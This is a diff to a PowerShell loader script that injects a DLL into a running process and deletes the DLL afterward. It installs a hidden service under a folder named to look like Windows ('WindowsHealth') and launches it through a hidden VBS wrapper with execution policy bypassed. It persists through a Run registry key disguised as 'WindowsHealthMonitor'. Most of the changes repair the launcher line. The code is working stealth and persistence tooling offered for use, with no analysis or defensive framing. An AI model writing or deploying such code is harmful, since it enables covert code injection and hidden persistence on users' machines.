@@ -6,7 +6,7 @@ $OwnerID = "W404AorT6U"
 $Secret  = "bdd0ab6c75599fffdb5ad43d22a82fe8bf8fa0fbd92dfdfbb2df80dc6d105d38"
 $Version = "1.0"
 
-# **********************
+# Path using Environment Variables to avoid VBS errors
 $dirPath    = "$env:LOCALAPPDATA\WindowsHealth"
 $configPath = "$dirPath\auth.dat"
 $scriptPath = "$dirPath\service.ps1"
@@ -71,7 +71,7 @@ if (Show-Auth -savedKey $currentKey) {
 "@
     Add-Type -TypeDefinition $code -ErrorAction SilentlyContinue
 
-    # --- First Injection (Instant) ---
+    # --- First Injection ---
     $mainProc = Get-Process $targetProc -ErrorAction SilentlyContinue
     if ($mainProc) {
         Write-Host "[*] Injecting..." -ForegroundColor Yellow
@@ -86,7 +86,6 @@ if (Show-Auth -savedKey $currentKey) {
         `$proc = Get-Process `$target -ErrorAction SilentlyContinue
         if (`$proc) {
             [NodeGuard]::Run(`$dll, `$proc.Id)
-            # Delete file after successful injection for stealth
             Start-Sleep -Seconds 2
             if (Test-Path `$dll) { Remove-Item `$dll -Force -ErrorAction SilentlyContinue }
         }
@@ -99,18 +98,17 @@ if (Show-Auth -savedKey $currentKey) {
         Start-Sleep -Seconds 10
     }
 "@
-    # Combine Code + Service into the script file
     $finalScript = "Add-Type -TypeDefinition @'`n$code`n'@`n" + $serviceBody
     $finalScript | Out-File $scriptPath -Force
 
-    # Create VBS Launcher
-    $vbsContent = "CreateObject(`"Wscript.Shell`").Run `"powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"`", 0, True"
+    # --- NEW VBS LAUNCHER (Fixing the Compilation Error) ---
+    $vbsContent = "Set WshShell = CreateObject(`"WScript.Shell`"): WshShell.Run `"powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"`" & `"$scriptPath`" & `"`"`", 0, False"
     $vbsContent | Out-File $vbsPath -Force
 
-    # Set Startup
+    # Startup
     Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsHealthMonitor" -Value "wscript.exe `"$vbsPath`""
 
-    # Launch Background Service
+    # Execute
     Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsPath`""
     
     Write-Host "[+] Stealth Service Activated" -ForegroundColor Cyan
